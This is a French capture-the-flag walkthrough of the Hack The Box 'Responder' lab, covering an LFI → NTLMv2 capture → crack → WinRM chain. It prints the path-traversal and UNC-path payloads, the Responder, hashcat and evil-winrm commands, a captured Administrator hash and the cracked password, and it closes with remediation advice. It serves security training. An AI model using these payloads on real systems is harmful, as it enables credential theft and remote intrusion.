# Responder

**Plateforme :** Hack The Box
**Catégorie :** Web / Windows
**Niveau :** Very Easy
**Date :** 01/10/2026

---

## Objectif

La machine héberge une application web PHP tournant sous Windows (XAMPP). L'objectif
est d'identifier une inclusion de fichier, d'en abuser pour forcer le serveur à
s'authentifier vers notre machine, de capturer puis cracker l'empreinte NTLMv2 de
l'Administrateur, et enfin d'ouvrir une session distante via WinRM pour récupérer le flag.

---

## Vulnérabilité identifiée

Le paramètre `page` de l'application est vulnérable à une **Local File Inclusion (LFI)**.
Comme l'application tourne sous Windows, ce paramètre accepte aussi des chemins **UNC**
(`\\ip\partage`). En pointant vers notre machine, on force le serveur Windows à tenter
une authentification **SMB**, ce qui expose l'empreinte **NetNTLMv2** du compte qui exécute
le service web.

---

## Reconnaissance

**Scan nmap :**

```bash
nmap -sV -sC 10.129.11.157
```

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
5985/tcp open  wsman   Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

- Port 80 ouvert — serveur Apache sous Windows, pile **XAMPP** (PHP 8.1.1)
- Port 5985 ouvert — **WinRM** (Windows Remote Management) : utile pour un accès distant si on obtient des credentials

**Accès au site web :**

En visitant `http://10.129.11.157`, on est redirigé vers `http://unika.htb`. Le nom de domaine
n'est pas résolu : il faut l'ajouter manuellement au fichier hosts.

```bash
echo "10.129.11.157 unika.htb" | sudo tee -a /etc/hosts
```

Le site propose un sélecteur de langue. En cliquant sur une langue, l'URL devient :

```
http://unika.htb/index.php?page=french.html
```

Le paramètre `page` qui charge un fichier directement dans l'URL est un signal classique de LFI.

---

## Exploitation

### 1. Confirmation de la LFI

On tente de remonter l'arborescence pour lire un fichier système Windows connu :

```
http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
```

Le contenu du fichier `hosts` Windows s'affiche : l'inclusion de fichier local est confirmée.

### 2. Forcer une authentification NTLM via chemin UNC

Comme l'hôte est sous Windows, on remplace le chemin local par un chemin UNC pointant vers
notre machine d'attaque. Le serveur va tenter de récupérer le fichier via SMB et, ce faisant,
envoyer les identifiants du compte de service.

On démarre d'abord **Responder** sur l'interface du VPN (`tun0`) :

```bash
sudo responder -I tun0
```

Puis on déclenche la requête vers notre partage :

```
http://unika.htb/index.php?page=//10.10.14.84/share
```

Responder capture l'empreinte **NetNTLMv2** du compte **Administrator** :

```
[SMB] NTLMv2-SSP Client   : 10.129.11.157
[SMB] NTLMv2-SSP Username  : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash      : Administrator::RESPONDER:9505c1f230cbbef2:20862BF8327D7A6BE9CBFD87907C2578:010100000000000080BF14246151DD018C52371E5063D12B0000000002000800360043005100320001001E00570049004E002D00500059004B00540057005500350031004A0048004C0004003400570049004E002D00500059004B00540057005500350031004A0048004C002E0036004300510032002E004C004F00430041004C000300140036004300510032002E004C004F00430041004C000500140036004300510032002E004C004F00430041004C000700080080BF14246151DD0106000400020000000800300030000000000000000100000000200000D9D4A685DAB5C2F9C056096225A27A60A0CAF501F0178DE7A836C02E23102DF40A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380034000000000000000000
```

On copie l'intégralité du hash dans un fichier :

```bash
echo 'Administrator::RESPONDER:9505c1f230cbbef2:20862BF8327D7A6BE9CBFD87907C2578:010100000000000080BF14246151DD018C52371E5063D12B0000000002000800360043005100320001001E00570049004E002D00500059004B00540057005500350031004A0048004C0004003400570049004E002D00500059004B00540057005500350031004A0048004C002E0036004300510032002E004C004F00430041004C000300140036004300510032002E004C004F00430041004C000500140036004300510032002E004C004F00430041004C000700080080BF14246151DD0106000400020000000800300030000000000000000100000000200000D9D4A685DAB5C2F9C056096225A27A60A0CAF501F0178DE7A836C02E23102DF40A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380034000000000000000000' > hash.txt
```

### 3. Crack de l'empreinte NetNTLMv2

Le mode hashcat pour NetNTLMv2 est **5600** :

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

Le mot de passe est retrouvé :

```
Administrator::RESPONDER:...:badminton
```

> Mot de passe : **badminton**

### 4. Accès distant via WinRM

Le port 5985 étant ouvert, on utilise **evil-winrm** avec les identifiants récupérés :

```bash
evil-winrm -i 10.129.11.157 -u administrator -p badminton
```

Une session PowerShell distante s'ouvre.

### 5. Lecture du flag

```powershell
type C:\Users\mike\Desktop\flag.txt
```

---

## Résultat

Flag récupéré via une chaîne complète : **LFI → capture NTLMv2 → crack → WinRM**.

---

## Impact

En conditions réelles, cette chaîne d'exploitation permettrait à un attaquant de :

- Lire des fichiers sensibles du serveur (configuration, code source, secrets) via la LFI.
- Capturer les empreintes NTLM de comptes privilégiés en forçant des authentifications SMB
  sortantes, puis les cracker hors ligne ou les rejouer (**NTLM relay**).
- Obtenir un accès distant complet à la machine via WinRM avec un compte à hauts privilèges,
  puis pivoter sur le reste du domaine Active Directory.

---

## Remédiation

- **Ne jamais inclure de fichier à partir d'une entrée utilisateur.** Utiliser une liste
  blanche de pages autorisées (ex. un tableau de correspondance) au lieu de passer le nom
  de fichier directement dans `include()`.
- Désactiver `allow_url_include` et `allow_url_fopen` dans la configuration PHP.
- Bloquer le trafic **SMB sortant** (ports 445/139) au niveau du pare-feu pour empêcher
  l'exfiltration d'empreintes NTLM vers un hôte externe.
- Appliquer une politique de mots de passe robustes pour résister au crack hors ligne.
- Restreindre et surveiller l'accès à WinRM (port 5985), le réserver à des hôtes de gestion.

---

## Références

- [HackTheBox — Starting Point](https://app.hackthebox.com/starting-point)
- [OWASP — File Inclusion](https://owasp.org/www-community/attacks/Path_Traversal)
- [Responder — GitHub](https://github.com/lgandx/Responder)
- [hashcat — exemples de modes](https://hashcat.net/wiki/doku.php?id=example_hashes)
